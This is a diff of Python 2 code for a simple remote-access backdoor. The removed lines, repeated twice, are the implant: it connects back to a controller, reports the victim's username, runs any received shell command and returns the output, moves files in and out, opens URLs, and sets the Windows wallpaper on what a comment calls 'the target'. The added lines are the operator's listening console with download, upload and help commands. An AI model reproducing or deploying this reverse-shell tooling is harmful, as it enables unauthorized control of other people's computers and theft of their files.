@@ -1,185 +1,114 @@
-
-
+#!/usr/bin/env python
 import socket 
-import subprocess 
-import os          
-import webbrowser
-import platform
-import ctypes
+import os      
+import threading
+import subprocess
 import hashlib
 
-def transfer(s,command,username):
-    x1,src,dst=map(str,command.split('*'))
-    if (x1=='download'):
-        if os.path.exists(src):
-            f = open(src, 'rb')
-            packet = f.read(1024)
-            while packet != '':
-                s.send(packet) 
-                packet = f.read(1024)
-            s.send('DONE')
-            f.close()
-        else: # the file doesn't exist
-            s.send('Unable to find out the file')
-  
-    elif (x1=='upload'):
-        file_to_write=open(dst,'wb')
-        bits=s.recv(1024)    
-        while True: 
-            if not bits.endswith('DONE'):
-                file_to_write.write(bits)
-            elif bits.endswith('DONE'):
-                bits=bits.replace('DONE','')
-                file_to_write.write(bits)
-                file_to_write.close()
-                break
-            bits=s.recv(1024)
-        md5_cl=hashlib.md5(open(dst,'rb').read()).hexdigest()
-        md5_sv=s.recv(1024)
-        if md5_cl==md5_sv:
-            s.send('md5 OK')
-        else :
-            s.send('md5 NOK')
-#upload needs fixing                
 
-def __browse(s,command):
-    new = 2 
-    url=command.split(' ')[-1]
-    url="http://"+url
-    webbrowser.open(url)
 
-def change_desktop_bg(s,command):
+def download(conn,command):
 
-    #need to make the path variable because i will normally upload an image from my system to the target
-    bg_path=str(command.split(' ')[-1])
-    
-    SPI_SETDESKWALLPAPER = 20 
-    ctypes.windll.user32.SystemParametersInfoA(SPI_SETDESKWALLPAPER, 0, bg_path , 0)
 
+	x,dest,src=map(str,command.split('*'))
+	conn.send(command)
+	f = open(dest,'wb') 
+	bits = conn.recv(1024)
+	while bits!='': 
+		if 'Unable to find out the file' in bits:
+			print '[-] Unable to find out the file'
+			break
+		f.write(bits)
+		bits=conn.recv(1024)
+		if bits.endswith('DONE'):
+			bits=bits.replace('DONE','')
+			f.write(bits)
+			f.close()
+			break
+		
+	
         
-def connect():
-    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    s.connect(('127.0.0.1', 8081))
-    os=str(platform.system())
-    CMD =  subprocess.Popen('whoami', shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
-    username=str(CMD.stdout.read().split('\\')[-1])
-    s.send(username)
-    while True: 
-        command=s.recv(1024)
-        if 'terminate' in command:
-            s.close()
-            break 
-        elif 'download' in command:            
-            transfer(s,command,username)
-        elif 'upload' in command:
-            transfer(s,command,username)
-        elif 'browse' in command:
-            __browse(s,command)
-        elif ('change_desktop_bg' in command ) and (os=='Windows'):             #BTW This is working only on windows
-            change_desktop_bg(s,command)
-        else:
-            CMD =  subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
-            s.send( CMD.stdout.read()  ) 
-            s.send( CMD.stderr.read()  ) 
+    
+def upload(conn,command):
 
+
+
+	x,src,dst=map(str,command.split('*'))
+	conn.send(command)
+	file_to_send=open(src,'rb')
+	packet=file_to_send.read(1024)
+	while packet!='':
+		conn.send(packet) 
+		packet = file_to_send.read(1024)
+	conn.send('DONE')
+	file_to_send.close()
+	md5_sv=hashlib.md5(open(src,'rb').read()).hexdigest()
+	conn.send(md5_sv)
+	print md5_sv
+	if conn.recv(1024)=='md5 OK':
+		print '[+] md5 Verified, File Uploaded Succesfully'
+
+
+def _help():
+	subprocess.call('clear',shell=True)
+	print 'The list of the available commands are : terminate,username,download,change_desktop_bg,browse,clear\n'
+	print 'To see the manual of each command type command() ex:download() , to exit this menu type exit()\n' 
+	
+	while True:
+		help_command=str(raw_input('Help#)'))
+		if help_command=='exit()':
+			break
+		elif help_command=='terminate()':
+			print 'terminate() ends the session'
+		elif help_command=='download()':
+			print 'download() downloads a file from the client machine the usage is download #source #dest'
+		elif help_command=='upload()':
+			print 'upload() uploads a file to the client machine the usage is upload #source #dest'
+	return
+
+def connect():
+        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        s.bind(("192.168.1.9", 8081))
+        s.listen(100)
+        print '[+] Listening for incoming TCP connection on port 8080'
+        conn,addr=s.accept()
+        print '[+] We got a connection from: ', addr[0]
+        username=conn.recv(1024)
+        print 'username is',username
+        print 'To see the lists of available commands please type help()'
+        while True:   
+                command=raw_input(">")		
+                if 'terminate' in command:
+                        conn.send('terminate')
+                        conn.close() 
+                        break
+                elif 'download' in command: 
+                        download(conn,command)
+                elif 'upload' in command:
+                        upload(conn,command)
+                elif 'browse' in command:
+                        conn.send(command)
+                        pass	
+                elif 'change_desktop_bg' in command:
+                        conn.send(command)
+                        pass
+                elif 'clear' in command:
+                		subprocess.call('clear',shell=True)
+                		pass
+                elif command=='help()':
+                		_help()
+                else :	
+                        conn.send(command) 
+                        print conn.recv(1024)
+        
 def main ():
-    connect()
+	connect()
 main()
 
 
 
 
 
-
-
-
-import socket 
-import subprocess 
-import os          
-import webbrowser
-import platform
-import ctypes
-import hashlib
-
-def transfer(s,command,username):
-    x1,src,dst=map(str,command.split('*'))
-    if (x1=='download'):
-        if os.path.exists(src):
-            f = open(src, 'rb')
-            packet = f.read(1024)
-            while packet != '':
-                s.send(packet) 
-                packet = f.read(1024)
-            s.send('DONE')
-            f.close()
-        else: # the file doesn't exist
-            s.send('Unable to find out the file')
-  
-    elif (x1=='upload'):
-        '''username=username.replace(username[-1],'')
-        username=username.replace('\r','')
-        file_to_write=open('C:\\Users\\'+username+'\\'+dst,'wb')'''
-        file_to_write=open(dst,'wb')
-        bits=s.recv(1024)    
-        while True: 
-            file_to_write.write(bits)
-            if bits.endswith('DONE'):
-                bits=bits.replace('DONE','')
-                file_to_write.write(bits)
-                file_to_write.close()
-                break
-            bits=s.recv(1024)
-        md5_cl=hashlib.md5(open(dst,'rb').read()).hexdigest()
-        md5_sv=s.recv(1024)
-        if md5_cl==md5_sv:
-            s.send('md5 OK')
-        else :
-            s.send('md5 NOK')
-#upload needs fixing                
-
-def __browse(s,command):
-    new = 2 
-    url=command.split(' ')[-1]
-    url="http://"+url
-    webbrowser.open(url)
-
-def change_desktop_bg(s,command):
-
-    #need to make the path variable because i will normally upload an image from my system to the target
-    bg_path=str(command.split(' ')[-1])
-    
-    SPI_SETDESKWALLPAPER = 20 
-    ctypes.windll.user32.SystemParametersInfoA(SPI_SETDESKWALLPAPER, 0, bg_path , 0)
-
-        
-def connect():
-    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    s.connect(('127.0.0.1', 8081))
-    os=str(platform.system())
-    CMD =  subprocess.Popen('whoami', shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
-    username=str(CMD.stdout.read().split('\\')[-1])
-    s.send(username)
-    while True: 
-        command=s.recv(1024)
-        if 'terminate' in command:
-            s.close()
-            break 
-        elif 'download' in command:            
-            transfer(s,command,username)
-        elif 'upload' in command:
-            transfer(s,command,username)
-        elif 'browse' in command:
-            __browse(s,command)
-        elif ('change_desktop_bg' in command ) and (os=='Windows'):             #BTW This is working only on windows
-            change_desktop_bg(s,command)
-        else:
-            CMD =  subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
-            s.send( CMD.stdout.read()  ) 
-            s.send( CMD.stderr.read()  ) 
-
-def main ():
-    connect()
-main()
 
 
 
